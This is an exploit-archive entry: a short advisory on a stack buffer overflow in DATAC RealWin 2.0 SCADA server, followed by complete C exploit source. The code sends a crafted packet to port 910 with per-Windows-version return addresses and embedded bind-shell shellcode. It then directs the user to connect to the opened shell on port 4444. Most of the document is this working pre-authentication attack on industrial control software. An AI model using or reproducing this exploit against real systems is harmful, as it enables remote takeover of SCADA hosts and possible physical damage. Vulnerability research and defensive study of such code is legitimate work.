source: http://www.securityfocus.com/bid/31418/info

DATAC RealWin SCADA server is prone to a remote stack-based buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.

An attacker can exploit this issue to execute arbitrary code in the context of the affected application. This may facilitate the complete compromise of affected computers. Failed exploit attempts may result in a denial-of-service condition.

RealWin SCADA server 2.0 is affected; other versions may also be vulnerable. 

////////////////////////////////////////////////////////////////////
////    DATAC RealWin 2.0 SCADA Software        - Remote PreAuth Exploit -. 
////    --------------------------------------------------------
////    This code can only be used for personal study
////    and/or research purposes on even days.
////
////    The author is not responsible for any illegal usage.
////    So if you flood your neighborhood that's your f******* problem =)
////    ---------------
////    Note
////    ---------------
////    ## The exploit has been tested against a build that seems pretty old.
////    ## Therefore this flaw may be not reproducible on newer versions.
////    
////    http://www.dataconline.com
////    http://www.realflex.com/download/form.php
////    
////    Ruben Santamarta www.reversemode.com
////    

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib,"wsock32.lib")


#define REALWIN_PORT    910
#define PACKET_HEADER_MAGIC 0x67542310

#define EXPLOIT_LEN             0x810
#define PING_LEN                0x200

#define FUNC_INFOTAG_SET_CONTROL        0x5000A
#define FUNC_PING               0x70001


typedef struct {
        const char *szTarget;
        ULONG_PTR retAddr;
} TARGET;


TARGET targets[] = {
                { "Windows 2000 SP4 [ES]",      0x779D4F6A},    // call esp - oleaut32.dll
        { "Windows 2000 SP4 [EN]",      0x77E3C256 },   // jmp esp - user32.dll
        { "Windows XP SP2 [EN]",        0x7C914393 },   // call  esp - ntdll.dll 
                { "Windows XP SP2 [ES]",        0x7711139B},    // call esp - oleaut32.dll
                { NULL,0xFFFFFFFF}
}; 

int main(int argc, char* argv[])
{
        WSADATA ws; 
        SOCKET tcp_socket, tcp_ping; 
        char bBuffer[0x10] = {0};
        struct sockaddr_in peer;
        char *pExploitPacket = NULL;
        char *pPingPacket = NULL;
        ULONG_PTR       uFixed;

        /* win32_bind -  EXITFUNC=thread LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com */
        unsigned char scode[] =
        "\x29\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa5"
        "\xd8\xfb\x1b\x83\xeb\xfc\xe2\xf4\x59\xb2\x10\x56\x4d\x21\x04\xe4"
        "\x5a\xb8\x70\x77\x81\xfc\x70\x5e\x99\x53\x87\x1e\xdd\xd9\x14\x90"
        "\xea\xc0\x70\x44\x85\xd9\x10\x52\x2e\xec\x70\x1a\x4b\xe9\x3b\x82"
        "\x09\x5c\x3b\x6f\xa2\x19\x31\x16\xa4\x1a\x10\xef\x9e\x8c\xdf\x33"
        "\xd0\x3d\x70\x44\x81\xd9\x10\x7d\x2e\xd4\xb0\x90\xfa\xc4\xfa\xf0"
        "\xa6\xf4\x70\x92\xc9\xfc\xe7\x7a\x66\xe9\x20\x7f\x2e\x9b\xcb\x90"
        "\xe5\xd4\x70\x6b\xb9\x75\x70\x5b\xad\x86\x93\x95\xeb\xd6\x17\x4b"
        "\x5a\x0e\x9d\x48\xc3\xb0\xc8\x29\xcd\xaf\x88\x29\xfa\x8c\x04\xcb"
        "\xcd\x13\x16\xe7\x9e\x88\x04\xcd\xfa\x51\x1e\x7d\x24\x35\xf3\x19"
        "\xf0\xb2\xf9\xe4\x75\xb0\x22\x12\x50\x75\xac\xe4\x73\x8b\xa8\x48"
        "\xf6\x8b\xb8\x48\xe6\x8b\x04\xcb\xc3\xb0\xea\x47\xc3\x8b\x72\xfa"
        "\x30\xb0\x5f\x01\xd5\x1f\xac\xe4\x73\xb2\xeb\x4a\xf0\x27\x2b\x73"
        "\x01\x75\xd5\xf2\xf2\x27\x2d\x48\xf0\x27\x2b\x73\x40\x91\x7d\x52"
        "\xf2\x27\x2d\x4b\xf1\x8c\xae\xe4\x75\x4b\x93\xfc\xdc\x1e\x82\x4c"
        "\x5a\x0e\xae\xe4\x75\xbe\x91\x7f\xc3\xb0\x98\x76\x2c\x3d\x91\x4b"
        "\xfc\xf1\x37\x92\x42\xb2\xbf\x92\x47\xe9\x3b\xe8\x0f\x26\xb9\x36"
        "\x5b\x9a\xd7\x88\x28\xa2\xc3\xb0\x0e\x73\x93\x69\x5b\x6b\xed\xe4"
        "\xd0\x9c\x04\xcd\xfe\x8f\xa9\x4a\xf4\x89\x91\x1a\xf4\x89\xae\x4a"
        "\x5a\x08\x93\xb6\x7c\xdd\x35\x48\x5a\x0e\x91\xe4\x5a\xef\x04\xcb"
        "\x2e\x8f\x07\x98\x61\xbc\x04\xcd\xf7\x27\x2b\x73\x4a\x16\x1b\x7b"
        "\xf6\x27\x2d\xe4\x75\xd8\xfb\x1b";

        int i,c;
        
        system("cls");
        printf("\n\t\t- DATAC RealWin 2.0 SCADA Software -\n");
        printf("\tProtocol Command INFOTAG/SET_CONTROL Stack Overflow\n");
        printf("\nRuben Santamarta - reversemode.com \n\n");

        if( argc < 3 )
        {
                
                printf("\nusage: exploit.exe ip TargetNumber");
                printf("\n\nexample: exploit 192.168.1.44 1\n\n");
                for( i = 0; targets[i].szTarget; i++ )
                {
                        printf("\n[ %d ] - %s", i, targets[i].szTarget);
                }
                printf("\n");
                exit(0);
        }

        WSAStartup(0x0202,&ws);

        peer.sin_family = AF_INET;
        peer.sin_port = htons( REALWIN_PORT );
        peer.sin_addr.s_addr = inet_addr( argv[1] ); 

        tcp_socket = socket(AF_INET, SOCK_STREAM, 0);
        
        if ( connect(tcp_socket, (struct sockaddr*) &peer, sizeof(sockaddr_in)) )
        {
                printf("\n[!!] Host unreachable :( \n\n");
                exit(0);
        }
        
        pExploitPacket = (char*) calloc( EXPLOIT_LEN, sizeof(char) );
        pPingPacket = (char*) calloc( PING_LEN, sizeof(char) );

        memset( (void*)pExploitPacket, 0x90, EXPLOIT_LEN);
        memset( (void*)pPingPacket, 0x90, PING_LEN);
        
        uFixed =  targets[atoi(argv[2])].retAddr;
        
        for( i=0x0; i< 0xbe; i++)
        {
                *( ( ULONG_PTR* ) (BYTE*)(pExploitPacket  + i*sizeof(ULONG_PTR) +2 )  ) = uFixed;
        }

        // Bypass silly things.
        *( ( ULONG_PTR* ) (BYTE*)(pExploitPacket  + 0xbe*sizeof(ULONG_PTR) +2 )  ) = 0x404040; 

        // MAGIC_HEADER
        *( ( ULONG_PTR* ) pExploitPacket ) = PACKET_HEADER_MAGIC;
        
        //Payload Length
        *( ( ULONG_PTR* ) pExploitPacket + 1 ) = 0x800;                         
        
        //MAKE_FUNC(FC_INFOTAG, FCS_SETCONTROL)
        *( (ULONG_PTR*)(( BYTE*) pExploitPacket + 10 ) ) =  FUNC_INFOTAG_SET_CONTROL;
        
        //First Parameter
        *( (ULONG_PTR*)(( BYTE*) pExploitPacket + 14 ) ) =  0x4; // Internal Switch
        
        //Mark
        *( (ULONG_PTR*)(( BYTE*) pExploitPacket + 44 ) ) =  0xDEADBEEF; // Our marker

        
        memcpy( (void*)((char*)pExploitPacket + EXPLOIT_LEN - sizeof(scode))
                        ,scode
                        ,sizeof(scode)-1);
                
        send(tcp_socket, pExploitPacket, EXPLOIT_LEN, 0 );

        printf("[+] Exploit packet sent...now checking host availability\n");

        // MAGIC_HEADER
        *( ( ULONG_PTR* ) pPingPacket ) = PACKET_HEADER_MAGIC;
        
        //Payload Length
        *( ( ULONG_PTR* ) pPingPacket + 1 ) = 0x20;                             
        
        //MAKE_FUNC(FC_INFOTAG, FCS_SETCONTROL)
        *( (ULONG_PTR*)(( BYTE*) pPingPacket + 10 ) ) =  FUNC_PING;
        
        //First Parameter
        *( (ULONG_PTR*)(( BYTE*) pPingPacket + 14 ) ) =  0x1;   // whatever
        
        //Mark
        *( (ULONG_PTR*)(( BYTE*) pPingPacket + 44 ) ) =  0xDEADBEEF; //Our marker

        tcp_ping = socket(AF_INET, SOCK_STREAM, 0);
        
        if ( connect(tcp_ping, (struct sockaddr*) &peer, sizeof(sockaddr_in)) )
        {
                printf("\n[!!] Host died, long live to the Host!  \n\n");
                exit(0);
        }
        
        i = recv(tcp_ping, bBuffer, 0x8, 0 );
        
        if( i )
        {
                printf("[+] The host is up and running\n\t:: %d bytes received: ",i);
                for(  c = 0; c<i; c++)
                        printf("%02X ", (unsigned char)bBuffer[c]);
        
                printf("\n");
        }else   {
                printf("\n[!!] Host died, long live to the Host!  \n\n");
        }

        closesocket(tcp_ping);
        closesocket(tcp_socket);

        Sleep(1000);
        printf("\n[+] Try: telnet %s 4444\n\n",argv[1]);        
        WSACleanup();

        return 0;
}